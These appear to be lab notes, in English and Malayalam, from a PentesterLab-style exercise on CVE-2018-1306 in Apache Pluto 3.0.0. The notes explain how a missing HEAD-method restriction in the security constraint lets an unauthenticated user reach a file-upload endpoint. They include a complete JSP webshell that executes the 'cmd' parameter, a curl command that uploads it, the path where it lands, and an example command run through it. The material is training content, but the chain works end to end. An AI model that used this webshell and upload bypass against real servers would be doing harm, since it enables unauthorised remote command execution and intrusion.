## Introduction
-->This exercise covers how you can gain code execution in Apache Pluto 3.0.0 due to an issue in the authorisation logic
-->This course details the exploitation of a vulnerability in Apache Pluto 3.0.0. The exploitation of this issue is based on the following [article](https://cxsecurity.com/issue/WLB-2018090134). This vulnerability allows a malicious user to upload a webshell by tampering with the HTTP method.

# CVE-2018-1306
## Introduction
-->This CVE is based on multiple issues:

-   an issue in access control
-   the ability to upload a filename with a dangerous extension

-->The most interesting (and most common in Java applications) issue comes from the way the access control is defined:
```java
	<security-constraint>
	    <web-resource-collection>
	      <web-resource-name>portal</web-resource-name>
	      <url-pattern>/portal</url-pattern>
	      <url-pattern>/portal/*</url-pattern>
	      <http-method>GET</http-method>
	      <http-method>POST</http-method>
	      <http-method>PUT</http-method>
	    </web-resource-collection>
	    <auth-constraint>
	      <role-name>pluto</role-name>
	    </auth-constraint>
	  </security-constraint>
```
-->The access control doesn't prevent the `HEAD` method (amongst others). This can be used to access the following URL (for example): `/pluto/portal/File%20Upload/__pdPortletV3AnnotatedDemo.MultipartPortlet%21-1517407963%7C0;0/__ac0` using `HEAD` instead of `GET` or `POST`.

## Building a Webshell
-->To build a Webshell, we will need to write some JSP, the following code can be used:
```jsp
<FORM METHOD=GET ACTION='webshell.jsp'>
	<INPUT name='cmd' type=text>
	<INPUT type=submit value='Run'>
	</FORM>
	<%@ page import="java.io.*" %>
	<%
	   String cmd = request.getParameter("cmd");
	   String output = "";
	   if(cmd != null) {
	      String s = null;
	      try {
	         Process p = Runtime.getRuntime().exec(cmd,null,null);
	         BufferedReader sI = new BufferedReader(new
	InputStreamReader(p.getInputStream()));
	         while((s = sI.readLine()) != null) { output += s+"</br>"; }
	      }  catch(IOException e) {   e.printStackTrace();   }
	   }
	%>
	<pre><%=output %></pre>
```
-->ith oru webshell.jsp enna file il aakuka.enit ee webshell aan namal code execution vendi use chyunath ok
## Exploitation
-->To exploit this issue, you need to send a multipart request that contains a file parameter named `file` that contains a malicious JSP to the following endpoint: `/pluto/portal/File%20Upload/__pdPortletV3AnnotatedDemo.MultipartPortlet%21-1517407963%7C0;0/__ac0`.
-->This can be done using a Proxy in repeater mode or `curl`.

## Gaining Commands execution
-->Once you upload your JSP file, you should be able to access the JSP file in the following directory: `/PortletV3AnnotatedDemo/temp/`

## Conclusion
-->This exercise explained how to take advantages of a very common misconfiguration in Java applications. And how this can be easily exploited to trigger unexpected behaviours. I hope you enjoyed learning with PentesterLab.

# Video Explanation
-->lab thurakumbol thane namuk apache pluto dashboard ilekula login page aan kanikunath
-->so pluto:pluto enna default credential koduth send adikumbol namuk keran patunila. sol ini namuk webshell upload chyan nokam
-->theory part il webshell und ath oru .jsp file il aaki save chyanam.
-->mukalil thoery part il access control chyuna code und.athil nokiyal kanam GET,POST,PUT polulla methods oke restrict chyunund.ennal HEAD,DELETE polula methods athil illa.so namuk HEAD method use chyth webshell add chyan nokam ok
-->The access control doesn't prevent the `HEAD` method (amongst others). This can be used to access the following URL (for example): `http://website-name/pluto/portal/File%20Upload/__pdPortletV3AnnotatedDemo.MultipartPortlet%21-1517407963%7C0;0/__ac0` using `HEAD` instead of `GET` or `POST`.
-->ini namuk curl command vech ee webshell upload chyam
->`curl -X HEAD 'http://ptl-407001ad-6a73c4b8.libcurl.so/pluto/portal/File%20Upload/__pdPortletV3AnnotatedDemo.MultipartPortlet%21-1517407963%7C0;0/__ac0' -F "file=@webshell.jsp" -vv`
-->ipol webshell upload aakum karanma namal HEAD enna method aan use chythath
-->so ini namal `/PortletV3AnnotatedDemo/temp/` enna pathilek pokuka.karanam avide aan shell upload chythath ok
-->http://ptl-407001ad-6a73c4b8.libcurl.so/pluto/portal  ingane aan namude login page ile url undavuka.so ithil ulla /pluto/portal remove chyth venam weshell upload chytha path ilek poka ie, ->http://ptl-407001ad-6a73c4b8.libcurl.so/PortletV3AnnotatedDemo/temp/webshell.jsp
-->ipol namuk webshell access chyan patunund.so ini onengil aa input il thane id enoke koduthal namuk command execute chyan patum ok allengil last ?cmd=id enn koduthalum namuk code execute chyan patum ok